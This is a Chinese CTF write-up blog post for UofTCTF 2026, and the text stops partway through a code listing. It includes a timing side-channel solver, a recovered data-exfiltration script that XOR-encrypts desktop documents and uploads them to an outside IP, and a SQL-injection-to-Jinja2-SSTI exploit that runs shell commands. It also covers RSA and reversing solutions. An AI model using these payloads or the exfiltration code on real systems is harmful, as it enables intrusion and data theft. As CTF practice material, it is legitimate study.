<!doctype html><html lang=en><head><meta name=viewport content="width=device-width,initial-scale=1"><title>Wh1teJ0kerのBlog</title>
<meta charset=utf-8><meta name=description content="Ladder@时间太仓促了，刚好在路上，很多没来得及看hhh"><meta name=author content="Wh1teJ0ker"><link rel=canonical href=https://wh1tej0ker.github.io/post/2026uoftctf-zv00ly.html><link rel=alternate type=application/rss+xml href=https://wh1tej0ker.github.io//index.xml title=Wh1teJ0kerのBlog><script async defer data-website-id=56cc42c1-3656-4d3e-af3c-acded927b8ed src=https://analytics.umami.is/script.js></script><meta property="og:url" content="https://wh1tej0ker.github.io/post/2026uoftctf-zv00ly.html"><meta property="og:site_name" content="Wh1teJ0kerのBlog"><meta property="og:title" content="2026UofTCTF"><meta property="og:description" content="时间太仓促了，刚好在路上，很多没来得及看hhh"><meta property="og:locale" content="zh_CN"><meta property="og:type" content="article"><meta property="article:section" content="post"><meta property="article:published_time" content="2026-01-11T18:30:20+08:00"><meta property="article:modified_time" content="2026-01-13T22:15:47+08:00"><meta name=twitter:card content="summary"><meta name=twitter:title content="2026UofTCTF"><meta name=twitter:description content="时间太仓促了，刚好在路上，很多没来得及看hhh"><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Posts","item":"https://wh1tej0ker.github.io/post/"},{"@type":"ListItem","position":2,"name":"2026UofTCTF","item":"https://wh1tej0ker.github.io/post/2026uoftctf-zv00ly.html"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"2026UofTCTF","name":"2026UofTCTF","description":"时间太仓促了，刚好在路上，很多没来得及看hhh","keywords":[],"articleBody":"2026UofTCTF Misc Reverse Wordle | 状态:solved｜Live 题目描述\nMy friend said they always use the same starting word, can you help me find out what it is?\nSubmit the sha256 hash of the ALL CAPS word wrapped in the flag format uoftctf{…}\nWriteUp\n把三局的“第一行反馈”分别用三局答案去约束（1=REBUT，67=CRASS，1336=DITTY）后，在官方可猜词表里唯一能同时满足三组反馈的起手词是：SQUIB。\nWordle 1 答案：REBUT Wordle 67 答案：CRASS Wordle 1336 答案：DITTY 对 ALL CAPS 的 SQUIB 做 SHA-256 得到：64b28ded00856c89688f8376f58af02dc941535cbb0b94ad758d2a77b2468646\n所以正确提交是：\nuoftctf{64b28ded00856c89688f8376f58af02dc941535cbb0b94ad758d2a77b2468646}\nEncryption Service | 状态:running｜Reproduction 题目描述\nWe made an encryption service. We forgot to make the decryption though. As compensation we are giving free encrypted flags\n​nc 34.86.4.154 5000​\nWriteUp\n奇怪的漏洞点，很新鲜，没见过，再看看\nGuess The Number | 状态:solved｜Live 题目描述\nGuess my super secret number\n​nc 35.231.13.90 5000​\nWriteUp\n单纯的猜测，在未知量是 100 bit，每次询问只回 Yes/No，最多 1 bit 信息。50 次最多 50 bit 信息，不够唯一确定 x。\n因此需要构造延时条件做侧信道\n这里构造了以下两个延时组件：\n1 2 delay_true_expr = (2 ** DELAY_EXP) \u003e 0 # 计算很慢，但结果恒 True delay_false_expr = (2 ** DELAY_EXP) \u003c 0 # 计算很慢，但结果恒 False Python 的 and/or 是短路的：A and B：如果 A 为 False，B 根本不会算，A or B：如果 A 为 True，B 根本不会算，而evaluate() 里写的就是 Python 原生的 and/or，所以短路同样成立。\n本地很快就通了，但是远程一直不行，网络背大锅，导致一直调大参数\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 import pwn import time import sys # Set logging level pwn.context.log_level = 'info' def solve(): if len(sys.argv) \u003e 2: host = sys.argv[1] port = int(sys.argv[2]) else: host = \"35.231.13.90\" port = 5000 pwn.log.info(f\"Connecting to {host}:{port}\") io = pwn.remote(host, port) DELAY_EXP = 80000000 TIME_THRESHOLD = 2.5 # Range [L, R) L = 0 R = 1 \u003c\u003c 100 # Delay expressions # DelayTrue: Returns True, Slow # DelayFalse: Returns False, Slow delay_true_expr = {'op': '\u003e', 'arg1': {'op': '**', 'arg1': 2, 'arg2': DELAY_EXP}, 'arg2': 0} delay_false_expr = {'op': '\u003c', 'arg1': {'op': '**', 'arg1': 2, 'arg2': DELAY_EXP}, 'arg2': 0} for i in range(50): size = R - L pwn.log.info(f\"Round {i}: Range=[{L}, {R}) size={size}\") if size \u003c= 1: # Burn remaining rounds pwn.log.info(\"Found number (or close enough), burning rounds\") io.sendlineafter(b': ', b'1') io.recvline() continue # Calculate cut points M1 = L + (size * 1) // 4 M2 = L + (size * 2) // 4 M3 = L + (size * 3) // 4 # Logic: # Query = ( (x \u003e= M2) and ( (x \u003c M3) or DelayTrue ) ) or ( (x \u003e= M1) and DelayFalse ) # Construct parts # P1 = (x \u003e= M2) p1 = {'op': '\u003e=', 'arg1': 'x', 'arg2': M2} # P2 = (x \u003c M3) or DelayTrue p2 = {'op': 'or', 'arg1': {'op': '\u003c', 'arg1': 'x', 'arg2': M3}, 'arg2': delay_true_expr} # Left Side = P1 and P2 left_side = {'op': 'and', 'arg1': p1, 'arg2': p2} # P3 = (x \u003e= M1) p3 = {'op': '\u003e=', 'arg1': 'x', 'arg2': M1} # Right Side = P3 and DelayFalse right_side = {'op': 'and', 'arg1': p3, 'arg2': delay_false_expr} # Full Query = Left Side or Right Side query = {'op': 'or', 'arg1': left_side, 'arg2': right_side} # Send and measure # Wait for prompt to ensure clean timing io.readuntil(b': ') start = time.time() io.sendline(str(query).encode()) res = io.recvline().decode().strip() end = time.time() duration = end - start is_slow = duration \u003e TIME_THRESHOLD is_yes = (res == \"Yes!\") pwn.log.info(f\"Time={duration:.4f}s (Slow={is_slow}), Response={res}\") # Determine Interval # False, Fast -\u003e Q0: [L, M1) # False, Slow -\u003e Q1: [M1, M2) # True, Fast -\u003e Q2: [M2, M3) # True, Slow -\u003e Q3: [M3, R) if not is_yes and not is_slow: # Q0 R = M1 pwn.log.info(\"Inferred: Q0 (False, Fast)\") elif not is_yes and is_slow: # Q1 L = M1 R = M2 pwn.log.info(\"Inferred: Q1 (False, Slow)\") elif is_yes and not is_slow: # Q2 L = M2 R = M3 pwn.log.info(\"Inferred: Q2 (True, Fast)\") elif is_yes and is_slow: # Q3 L = M3 pwn.log.info(\"Inferred: Q3 (True, Slow)\") # Final guess pwn.log.info(f\"Final Range: [{L}, {R})\") guess = L pwn.log.info(f\"Guessing: {guess}\") io.sendlineafter(b'Guess the number: ', str(guess).encode()) # Read flag result = io.recvall().decode() print(result) if __name__ == \"__main__\": solve() Lottery | 状态:running｜Reproduction 题目描述\nHan Shangyan quietly gives away all his savings to protect someone he cares about, leaving himself with nothing. Now broke, his only hope is chance itself.\nCan you help Han Shangyan win the lottery?\n​nc 35.245.30.212 5000​\nWriteUp\n暂无\nK\u0026K Training Room | 状态:running｜Reproduction 题目描述\nWelcome to the K\u0026K Training Room. Before every match, players must check in through the bot.\nA successful check in grants the K\u0026K role, opening access to team channels and match coordination.\nhttps://discord.gg/3u6V8uAGm7\nWriteUp\n暂无\nFile Upload | 状态:running｜Reproduction 题目描述\nUpload and download files\nWriteUp\n暂无\nVibe Code | 状态:running｜Reproduction 题目描述\nAI is so ubiquitous in CTF, so I am forcing you to use it to solve this easy C jail.\n​nc 34.23.133.46 5000​\nWriteUp\n暂无\nNothing Ever Changes | 状态:running｜Reproduction 题目描述\nWhile conducting her research on artificial intelligence, Tong Nian claims to have found a way to create adversarial examples without changing anything at all. Her colleagues are skeptical. Can you help her hash out the details of her approach and verify its validity?\nTry it out here!\nWriteUp\n暂无\nOSINT Go Go Coaster! | 状态:solved｜Live 题目描述\nDuring an episode of Go Go Squid!, Han Shangyan was too scared to go on a roller coaster. What’s the English name of this roller coaster? Also, what’s its height in whole feet?\nFlag format: uoftctf{Coaster_Name_HEIGHT}\nExample: uoftctf{Yukon_Striker_999}\nNotes:\nFlag is case-insenstive, just remember to replace spaces with underscores and no decimal points WriteUp\n《亲爱的，热爱的》（Go Go Squid!）第 12 集去的 上海欢乐谷里那台“主角认证的恐怖级跌落式过山车（近 90 度垂直俯冲）”。\n这台过山车在英文资料里的名称就是：\n​Diving Coaster（地点：Happy Valley Shanghai / 上海欢乐谷） 高度：​65 m，折合 ​约 213 英尺（whole feet 取 213）。 1 uoftctf{Diving_Coaster_213} Go Go Cabinet! | 状态:running｜Reproduction 题目描述\nI really like Go Go Squid! In fact, I like it so much that I even bought the same model of cabinet that is in the series!\nCan you find:\nThe first and last name of the designer of this cabinet? The episode and timestamp that this cabinet first appears at all in the series on YouTube? Flag format: uoftctf{First_Last_EpisodeNum_MM:SS}\nExample: uoftctf{John_Doe_06_07:27}\nNotes:\nMind the flag format/example :) There is a 1-second fowards leniency in the timestamp (if 1:00 is correct, then 1:01 is correct) WriteUp\n暂无\nMy Shikishi is Fake! | 状态:running｜Reproduction 题目描述\nAfter the whole incident with Pokemon cards, Han Shangyan decided to buy Tong Nian shikishis autographed by famous manga artists instead. He came across this seller with autographs and sketches done by creators of Dragon Ball, Chainsaw Man, and more, all with certificates of authenticity and money-back guarantees! Surely this is too good to be true?\nTurns out that this particular brand of high-quality fakes have been in production for over a decade, spanning multiple platforms, sellers, and authentication company names, though one name is always constant: the appraiser’s.\nWhat you will need to find:\nFirst and last name of the appraiser in Japanese (how it appears on the certificate). Email that is tied to one of the organizations that the certificate is issued by. The year that they were reborn and started to expand the scope of their activities. PSA did another oopsie authenticating one of these fakes, a shikishi of Draken and Mikey, which a foreigner unfortunately bought and posted. Find its certification number. The flag format will be uoftctf{JPNAME_EMAIL_YEAR_CERT}\nExample: uoftctf{山田太郎_example@example.com_9999_AA99999}\nNotes:\nOSINTing the author will not help, though you are free to do so. Flag is case-sensitive. WriteUp\n暂无\nT1 | 状态:solved/running｜Reproduction 题目描述\nHan Shangyan wanted to buy an autographed Pokemon card for Tong Nian. Unfortunately, he found out that it was fake! He wants to find out more about this forger, but they have deleted the auction! Can you help him put a stop to this 2-year-long scheme?\nhttps://auctions.yahoo.co.jp/jp/auction/t1101312767\nWhat you will need to find:\nThe link to the forger’s Yahoo Japan Auctions profile The link to the forger’s Mercari profile, where they still sell similar forgeries to this day One of the seller’s forgeries of the same Pokemon artist as the forgery in the link given was graded and authenticated with PSA (most trustworthy grading service btw)! Find how much yen it sold for originally. The first and last name of the Pokemon artist of the first autograph in the PSA submission that the forger submitted that contains the card from (3). Finally, the forger copied the card from (3) from a real signing event to make it look real. What Pokemon artist was first to autograph in that event? Get their twitter username. The flag format will be uoftctf{URL1_URL2_AMT_FIRSTNAME_LASTNAME_USERNAME}\nCopy the full URLs.\nExample: uoftctf{https://auctions.yahoo.co.jp/seller/fhrh2HFHdqw229nrr34r89jdg_https://jp.mercari.com/user/profile/999999_99999_John_Doe_example}\nNotes:\nOSINTing the author will not help you, though you are free to do so. Flag is case-insensitive. WriteUp\n暂无\nForensics Baby Exfil | 状态:solved｜Live 题目描述\nTeam K\u0026K has identified suspicious network activity on their machine. Fearing that a competing team may be attempting to steal confidential data through underhanded means, they need your help analyzing the network logs to uncover the truth.\nWriteUp\n翻找流量找到了恶意脚本\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 import os import requests key = \"G0G0Squ1d3Ncrypt10n\" server = \"http://34.134.77.90:8080/upload\" def xor_file(data, key): result = bytearray() for i in range(len(data)): result.append(data[i] ^ ord(key[i % len(key)])) return bytes(result) base_path = r\"C:\\Users\\squid\\Desktop\" extensions = ['.docx', '.png', \".jpeg\", \".jpg\"] for root, dirs, files in os.walk(base_path): for file in files: if any(file.endswith(ext) for ext in extensions): filepath = os.path.join(root, file) try: with open(filepath, 'rb') as f: content = f.read() encrypted = xor_file(content, key) hex_data = encrypted.hex() requests.post(server, files={'file': (file, hex_data)}) print(f\"Sent: {file}\") except: pass 从流57开始可以找到几个upload接口的记录\n然后提取逆向即可\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 import scapy.all as scapy import re import os PCAP_FILE = '/Users/joker/Code/2026Uoftctf/Forensics/final.pcapng' KEY = \"G0G0Squ1d3Ncrypt10n\" OUTPUT_DIR = '/Users/joker/Code/2026Uoftctf/Forensics/extracted' if not os.path.exists(OUTPUT_DIR): os.makedirs(OUTPUT_DIR) def xor_file(data, key): result = bytearray() for i in range(len(data)): result.append(data[i] ^ ord(key[i % len(key)])) return bytes(result) print(f\"Reading {PCAP_FILE}...\") try: packets = scapy.rdpcap(PCAP_FILE) print(f\"Read {len(packets)} packets.\") except Exception as e: print(f\"Error reading pcap: {e}\") exit(1) # Target: 34.134.77.90:8080 target_ip = \"34.134.77.90\" target_port = 8080 # Organize packets by TCP stream streams = {} for pkt in packets: if scapy.TCP in pkt and scapy.IP in pkt: ip = pkt[scapy.IP] tcp = pkt[scapy.TCP] if ip.dst == target_ip and tcp.dport == target_port: stream_key = (ip.src, tcp.sport, ip.dst, tcp.dport) if stream_key not in streams: streams[stream_key] = [] streams[stream_key].append(pkt) print(f\"Found {len(streams)} streams to target.\") for stream_key, stream_packets in streams.items(): # Sort by sequence number to handle out-of-order stream_packets.sort(key=lambda p: p[scapy.TCP].seq) unique_packets = [] seen_seqs = set() for p in stream_packets: seq = p[scapy.TCP].seq # We also need to consider payload length, but simple seq check helps if seq not in seen_seqs: unique_packets.append(p) seen_seqs.add(seq) # Reassemble payload full_payload = b\"\" for p in unique_packets: if scapy.Raw in p: full_payload += p[scapy.Raw].load print(f\"Stream {stream_key}: {len(stream_packets)} packets, payload size: {len(full_payload)}\") if len(full_payload) \u003e 0: print(f\" Head: {full_payload[:50]}\") if len(full_payload) \u003e 0: # Check if it looks like a multipart body (starts with --) # OR contains POST /upload if b\"POST /upload\" in full_payload: print(f\"Processing stream {stream_key} (Found POST header)\") # Try to find boundary in headers boundary_match = re.search(rb'Content-Type: multipart/form-data; boundary=(.+?)\\r\\n', full_payload) if boundary_match: boundary = boundary_match.group(1) else: # Fallback: try to find boundary from body start # Look for first line starting with -- match = re.search(rb'(--[a-zA-Z0-9]+)\\r\\n', full_payload) if match: boundary = match.group(1)[2:] # strip -- else: print(\" No boundary found.\") continue elif full_payload.startswith(b'--'): print(f\"Processing stream {stream_key} (Found Body start)\") # Extract boundary from first line first_line_end = full_payload.find(b'\\r\\n') if first_line_end != -1: boundary = full_payload[2:first_line_end] else: print(\" Cannot parse boundary.\") continue else: continue print(f\" Boundary: {boundary}\") # Split by boundary # The body parts are separated by --boundary parts = full_payload.split(b'--' + boundary) for part in parts: if b'filename=\"' in part: # Extract filename filename_match = re.search(rb'filename=\"(.+?)\"', part) if filename_match: filename = filename_match.group(1).decode('utf-8', errors='ignore') # Extract content # Look for double CRLF header_end = part.find(b'\\r\\n\\r\\n') if header_end != -1: # The content ends with \\r\\n before the next boundary, # but split() removed the next boundary. # However, the part string might end with \\r\\n (or \\r\\n--) # The split consumes '--boundary', but the preceding \\r\\n is part of the 'part' string usually? # Actually, multipart format is: # --boundary\\r\\nHeaders\\r\\n\\r\\nBody\\r\\n--boundary # So 'part' will start with \\r\\nHeaders... and end with \\r\\n body = part[header_end+4:] # Trim trailing \\r\\n if body.endswith(b'\\r\\n'): body = body[:-2] # The body is the hex string try: hex_str = body.decode('ascii').strip() # It might be very long print(f\" Found file: {filename}, hex length: {len(hex_str)}\") encrypted_bytes = bytes.fromhex(hex_str) decrypted_bytes = xor_file(encrypted_bytes, KEY) save_path = os.path.join(OUTPUT_DIR, os.path.basename(filename)) with open(save_path, 'wb') as f: f.write(decrypted_bytes) print(f\" Success: Saved to {save_path}\") except Exception as e: print(f\" Failed to process {filename}: {e}\") 在其中一张图里找到了flag\n1 uoftctf{b4by_w1r3sh4rk_an4lys1s} My Pokemon Card is Fake! | 状态:running｜Reproduction 题目描述\nHan Shangyan noticed that recently, Tong Nian has been getting into Pokemon cards. So, what could be a better present than a literal prototype for the original Charizard? Not only that, it has been authenticated and graded a PRISTINE GEM MINT 10 by CGC!!!\nHan Shangyan was able to talk the seller down to a modest 6-7 figure sum (not kidding btw), but when he got home, he had an uneasy feeling for some reason. Can you help him uncover the secrets that lie behind these cards?\nWhat you will need to find:\nDate and time (relative to the printer, and 24-hour clock) that it was printed. Printer’s serial number. The flag format will be uoftctf{YYYY_MM_DD_HH:MM_SERIALNUM}\nExample: uoftctf{9999_09_09_23:59_676767676}\nNotes:\nYou’re free to dig more into the whole situation after you’ve solved the challenge, it’s very interesting, though so much hasn’t been or can’t be said :( Two days after I write this challenge, I’m going to meet the person whose name was used for all this again. Hopefully I’ll be back to respond to tickets!!! WriteUp\n暂无\nWeb No Quotes | 状态:solved｜Live 题目描述\nUnless it’s from “Go Go Squid!”, no quotes are allowed here! Let this wholesome quote heal your soul:\nAi Qing: “If you didn’t know about robot combat back then, what would you be doing?”\nWu Bai: “There’s no if. As long as you’re here, I’ll be here.”\nWriteUp\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 import requests import sys # Configuration TARGET_URL = \"http://localhost:5001\" if len(sys.argv) \u003e 1: TARGET_URL = sys.argv[1] if not TARGET_URL.startswith(\"http://\") and not TARGET_URL.startswith(\"https://\"): TARGET_URL = \"https://\" + TARGET_URL LOGIN_URL = f\"{TARGET_URL}/login\" HOME_URL = f\"{TARGET_URL}/home\" def solve(): print(f\"[*] Targeting: {TARGET_URL}\") # SSTI Payload to execute /readflag # We use the standard RCE payload for Jinja2 ssti_payload = \"{{ self.__init__.__globals__.__builtins__.__import__('os').popen('/readflag').read() }}\" # Convert payload to hex for SQL injection (to avoid quotes) ssti_hex = \"0x\" + ssti_payload.encode().hex() # SQL Injection Payload # Username: \\ -\u003e Escapes the closing quote, consuming the query up to the next quote # Password: UNION SELECT 1, # # # Query logic: # SELECT ... WHERE username = ('{username}') AND password = ('{password}') # With username=\\: # SELECT ... WHERE username = ('\\') AND password = ('{password}') # The string literal becomes: ') AND password = ( # The rest of the query is interpreted as SQL: {password}') # We inject UNION SELECT to return our payload as the username. username = \"\\\\\" # We need to close the parenthesis opened by \"username = (\" # The backslash consumed the original closing quote and parenthesis into the string. # So the query structure is: WHERE username = ( 'string_literal' [INJECTED] # We need to add ')' to close it. password = f\") UNION SELECT 1, {ssti_hex} -- \" print(\"[*] Sending exploit payload...\") session = requests.Session() data = { \"username\": username, \"password\": password } response = session.post(LOGIN_URL, data=data) if response.status_code == 200 and \"Invalid credentials\" in response.text: print(\"[-] Login failed. Exploit might need adjustment.\") # Debugging output # print(response.text) return # Check if we are redirected or logged in # The app returns a redirect on success, requests follows it automatically if response.url == HOME_URL or \"Welcome,\" in response.text: print(\"[+] Login successful! Checking for flag...\") # The home page renders the username using render_template_string # triggering the SSTI payload. if \"uoftctf{\" in response.text: flag = response.text.split(\"uoftctf{\")[1].split(\"}\")[0] print(f\"[+] Flag found: uoftctf{{{flag}}}\") else: print(\"[+] Payload executed, but no flag in response.\") print(\"Response content:\") print(response.text) else: print(\"[-] Unexpected response.\") print(f\"Status: {response.status_code}\") print(f\"URL: {response.url}\") if __name__ == \"__main__\": solve() Firewall | 状态:running｜Reproduction 题目描述\nFree flag at /flag.html\n​curl http://35.227.38.232:5000​\nWriteUp\n暂无\nPersonal Blog | 状态:running｜Reproduction 题目描述\nFor your eyes only?\nVisit the website here.\nWriteUp\n暂无\nNo Quotes 2 | 状态:running｜Reproduction 题目描述\nUnless it’s from “Go Go Squid!”, no quotes are allowed here! Let this wholesome quote heal your soul:\nAi Qing: “If you didn’t know about robot combat back then, what would you be doing?”\nWu Bai: “There’s no if. As long as you’re here, I’ll be here.”\nNow complete with a double check for extra security!\nWriteUp\n暂无\nNo Quotes 3 | 状态:running｜Reproduction 题目描述\nUnless it’s from “Go Go Squid!”, no quotes are allowed here! Let this wholesome quote heal your soul:\nAi Qing: “If you didn’t know about robot combat back then, what would you be doing?”\nWu Bai: “There’s no if. As long as you’re here, I’ll be here.”\nNow complete with a double check for extra security AND ​proper hashing!\n(The author also hates periods and is 6'7\" btw)\nWriteUp\n暂无\nPasteboard | 状态:running｜Reproduction 题目描述\nFor Team K\u0026K, dating is forbidden. So Mi Shaofei and Sun Yaya hide their relationship the only way they can: by slipping messages into a notes sharing app.\nWriteUp\n暂无\nUnrealistic Client-Side Challenge - Flag 1 | 状态:running｜Reproduction 题目描述\nHan Shangyan was tired of Team K\u0026K getting skill-diffed every time they were faced with client-side web challenges. After some self-reflection, he finally accepted that training his squad solely with aim trainers might not be the best approach. Instead, he decided to make a totally realistic CTF challenge for his team to practice on.\nSubmit flag 1 here. Both challenges use the same attachment.\nNote: Port 5001 is not exposed on the remote instance. However, the bot can still access it and this does not interfere with the intended solution.\nWriteUp\n暂无\nVulnerability Research | 状态:running｜Reproduction 题目描述\nInspired by the recent 10.0 CVSS react2shell vulnerability, Han Shangyan decided to embark on a web application framework auditing journey himself. He stumbled upon this old web framework. Can you help him audit it for any bugs?\nNote: This challenge involves exploiting a real 0-day. Please refrain from posting writeups or sharing details about the vulnerability publicly until it has been patched by the maintainers.\nWriteUp\n暂无\nUnrealistic Client-Side Challenge - Flag 2 | 状态:running｜Reproduction 题目描述\nHan Shangyan was tired of Team K\u0026K getting skill-diffed every time they were faced with client-side web challenges. After some self-reflection, he finally accepted that training his squad solely with aim trainers might not be the best approach. Instead, he decided to make a totally realistic CTF challenge for his team to practice on.\nSubmit flag 2 here. Both challenges use the same attachment.\nNote: Port 5001 is not exposed on the remote instance. However, the bot can still access it and this does not interfere with the intended solution.\nWriteUp\n暂无\nRev Baby (Obfuscated) Flag Checker | 状态:solved｜Live 题目描述\nAll this obfuscation has left Han Shangyan seeing double. Even Grunt refuses to untangle this mess for him, so it’s up to you to do the real gruntwork (hahaha get it???).\nHint: This challenge can be solved without fully deobfuscating the script, but writing a deobfuscator might help you with the “ML Connoisseur” challenge…\nWriteUp\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 def lcg_random(seed): state = seed while True: # Based on GGs logic: # if g0gOSqu1D == 853: ... return G0Gosqu1D * 1103515245 + 12345 \u0026 2147483647 return (state * 1103515245 + 12345) \u0026 2147483647 def get_permutation(n): # Based on Ggs logic state = 195936478 # GGs_675671 initial value items = list(range(n)) result = [] while items: state = lcg_random(state) idx = state % len(items) result.append(items.pop(idx)) return result def get_expected_chunk(idx): # G0gosQu1D data ENCRYPTED_CHUNKS = [ [13, 73, 41, 30, 53, 34], [8, 18, 27, 9, 30, 9, 27, 6, 25, 76, 25, 34], [37, 57, 66, 66, 66, 0], [25, 78, 63, 8, 58, 34], [77, 19, 78, 34, 14, 21, 77, 74, 34], [73, 19, 34, 76, 49, 48, 34], [15, 78, 11, 34, 77, 15, 34], [9, 21, 76, 72, 34, 10, 76, 74, 21, 34], [4, 77, 8, 34, 16, 77, 19, 22, 78, 36, 34] ] key = 125 # (90 ^ 60) + 23 \u0026 255 return \"\".join(chr(c ^ key) for c in ENCRYPTED_CHUNKS[idx]) def get_chunk_position(target_idx): CHUNK_LENGTHS = [6, 12, 6, 6, 9, 7, 7, 10, 11] # sQU1D CHUNK_ORDER = [1, 8, 0, 3, 6, 4, 7, 5, 2] # SqUId pos = 0 for idx in CHUNK_ORDER: if idx == target_idx: return pos pos += CHUNK_LENGTHS[idx] return pos def solve(): perm = get_permutation(9) print(f\"Permutation: {perm}\") # Flag length is 74 (checked in line 197) flag_chars = [''] * 74 for idx in perm: chunk = get_expected_chunk(idx) pos = get_chunk_position(idx) print(f\"Chunk {idx}: '{chunk}' at pos {pos}\") for i, c in enumerate(chunk): if pos + i \u003c 74: flag_chars[pos + i] = c else: print(f\"Error: Index out of bounds {pos+i}\") print(\"Flag:\", \"\".join(flag_chars)) if __name__ == \"__main__\": solve() Bring Your Own Program | 状态:running｜Reproduction 题目描述\nTeam K\u0026K discovered a mysterious emulator for an unknown architecture. I wonder what kind of programs it can run…\n​nc 35.245.96.82 5000​\nWriteUp\n暂无\nSymbol of Hope | 状态:running｜Reproduction 题目描述\nLike a beacon in the dark, Go Go Squid! stands as a symbol of hope to those who seek to be healed.\nWriteUp\n暂无\nWill u Accept Some Magic? | 状态:running｜Reproduction 题目描述\nHow does Kotlin compile to wasm so well? Where did my heap go?\nWrap the password in uoftctf{}\nWriteUp\n暂无\nML Connoisseur | 状态:running｜Reproduction 题目描述\nTong Nian is a talented machine learning student. She claims to have built a classifier, but never revealed what it is supposed to recognize. The model behaves oddly, and its purpose is unclear. Can you figure out what it’s really classifying?\nDownload: https://uoftctf-2026-downloads.uoftctf.org/ml-connoisseur.zip\nExample usage: python chal.py examples/0.png​\nWriteUp\n暂无\nCrypto Leaked d | 状态:solved｜Live 题目描述\nSomeone leaked my d, surely generating a new key pair is safe enough.\nn1=144193923737869044259998596038292537217126517072587407189785154961344425600188709243733103713567903690926695626210849582322575275021963176688615503362430255878068025864333805901831356111202249176714839010151878345993886718863579928588098080351940561045688931786378656665718140998014299097023143181095121810219\ne1=65537\nd1=12574092103116126584156918631595005114605155027996964036950457918490065036621732354668884564796078087090438462300608898225025828108557296714458055780952572974382089675780912070693778415852291145766476219909978391880801604060224785419022793121117332853938170749724540897211958251465747669952580590146500249193\ne2=6767671\nc=31703515320997441500407462163885912085193988887521686491271883832485018463764003313655377418478488372329742364292629844576532415828605994734718987367062694340608380583593689052813716395874850039382743513756381017287371000882358341440383454299152364807346068866304481227367259672607408256375720022838698292966\nWriteUp\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 from Crypto.Util.number import inverse, long_to_bytes import math # ================== 已知参数 ================== n = 144193923737869044259998596038292537217126517072587407189785154961344425600188709243733103713567903690926695626210849582322575275021963176688615503362430255878068025864333805901831356111202249176714839010151878345993886718863579928588098080351940561045688931786378656665718140998014299097023143181095121810219 e1 = 65537 d1 = 12574092103116126584156918631595005114605155027996964036950457918490065036621732354668884564796078087090438462300608898225025828108557296714458055780952572974382089675780912070693778415852291145766476219909978391880801604060224785419022793121117332853938170749724540897211958251465747669952580590146500249193 e2 = 6767671 c = 31703515320997441500407462163885912085193988887521686491271883832485018463764003313655377418478488372329742364292629844576532415828605994734718987367062694340608380583593689052813716395874850039382743513756381017287371000882358341440383454299152364807346068866304481227367259672607408256375720022838698292966 # ================== Step 1: 恢复 φ(n) ================== k = e1 * d1 - 1 # 尝试分解 k = φ(n) * t for t in range(1, 1_000_000): if k % t != 0: continue phi = k // t # 解二次方程 x^2 - (n - phi + 1)x + n = 0 s = n - phi + 1 delta = s * s - 4 * n if delta \u003c 0: continue r = int(math.isqrt(delta)) if r * r != delta: continue p = (s + r) // 2 q = (s - r) // 2 if p * q == n: print(\"[+] Found factors!\") break else: raise Exception(\"Failed to factor n\") # ================== Step 2: 计算新的私钥 d2 ================== phi = (p - 1) * (q - 1) d2 = inverse(e2, phi) # ================== Step 3: 解密 ================== m = pow(c, d2, n) print(long_to_bytes(m)) Gambler’s Fallacy | 状态:solved｜Live 题目描述\ncan we win a zillion dollars tonight?\nalgorithms inspired by primedice\n​nc 34.162.20.138 5000​\nWriteUp\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 147 148 149 150 151 152 153 154 155 156 157 158 159 160 161 162 163 164 165 166 167 168 169 170 171 172 173 174 175 176 177 178 179 180 181 182 183 184 185 186 187 188 189 190 191 192 193 194 195 196 197 198 199 200 201 202 203 204 205 206 207 208 209 210 211 212 213 214 215 216 217 218 219 220 221 222 223 224 225 226 227 228 229 230 231 232 233 234 235 import socket import re import random import hmac import hashlib import time import sys # Untempering functions def undo_right_shift_xor(y, shift): x = y for _ in range(shift, 32, shift): x = y ^ (x \u003e\u003e shift) return x def undo_left_shift_xor_mask(y, shift, mask): x = y for _ in range(shift, 32, shift): x = y ^ ((x \u003c\u003c shift) \u0026 mask) return x def untemper(y): y = undo_right_shift_xor(y, 18) y = undo_left_shift_xor_mask(y, 15, 0xefc60000) 